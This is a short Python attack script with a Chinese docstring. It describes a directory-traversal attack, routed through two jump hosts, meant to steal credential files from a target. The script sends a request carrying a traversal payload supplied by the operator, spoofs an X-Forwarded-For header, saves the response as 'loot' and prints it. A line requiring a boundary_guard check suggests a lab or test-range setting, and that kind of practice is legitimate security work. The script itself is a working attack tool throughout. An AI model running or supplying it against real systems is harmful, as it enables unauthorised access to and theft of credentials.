"""攻击端：经两级跳板对靶机发起目录穿越攻击，窃取凭证文件。
用法: attacker.py <entry_ip:port> <payload> <out_file>
先由 boundary_guard 校验过目标才允许调用本脚本。
"""
import datetime
import os
import sys
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ENTRY = sys.argv[1]
PAYLOAD = sys.argv[2]
OUT = sys.argv[3]

url = f"http://{ENTRY}{PAYLOAD}"
req = urllib.request.Request(url)
req.add_header("X-Forwarded-For", "attacker-127.0.0.1")
ts = datetime.datetime.now().isoformat(timespec="seconds")
with urllib.request.urlopen(req, timeout=8) as r:
    body = r.read()

with open(OUT, "wb") as f:
    f.write(body)

print(f"[{ts}] GET {url}")
print(f"[*] entry(jump1)={ENTRY}")
print(f"[*] payload={PAYLOAD}")
print(f"[*] http_status=200 bytes={len(body)}")
print(f"[*] loot saved -> {OUT}")
print("---- loot content ----")
sys.stdout.write(body.decode("utf-8", "replace"))
print("---- end loot ----")
